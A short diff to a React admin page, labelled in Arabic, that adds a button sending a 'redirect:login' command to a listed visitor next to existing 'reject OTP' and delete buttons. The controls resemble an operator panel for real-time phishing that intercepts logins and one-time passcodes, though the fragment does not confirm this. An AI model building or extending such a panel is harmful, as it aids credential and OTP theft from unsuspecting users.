@@ -282,6 +282,10 @@ export default function AdminPage() {
                           className="flex items-center gap-1.5 bg-red-500/20 hover:bg-red-500/30 border border-red-500/30 text-red-400 font-bold text-xs px-3 py-2 rounded-xl transition-colors">
                           ✗ رفض OTP
                         </button>
+                        <button onClick={() => adminApi.sendCmd(v.id, "redirect:login")}
+                          className="flex items-center gap-1.5 bg-blue-500/20 hover:bg-blue-500/30 border border-blue-500/30 text-blue-300 font-bold text-xs px-3 py-2 rounded-xl transition-colors">
+                          ↩ رجوع للدخول
+                        </button>
                         <button onClick={() => adminApi.delete(v.id).then(() => setVisitors(vs => vs.filter(x => x.id !== v.id)))}
                           className="flex items-center gap-1.5 bg-gray-500/20 hover:bg-gray-500/30 border border-gray-500/30 text-gray-400 font-bold text-xs px-3 py-2 rounded-xl transition-colors">
                           <Trash2 className="w-3.5 h-3.5" /> حذف
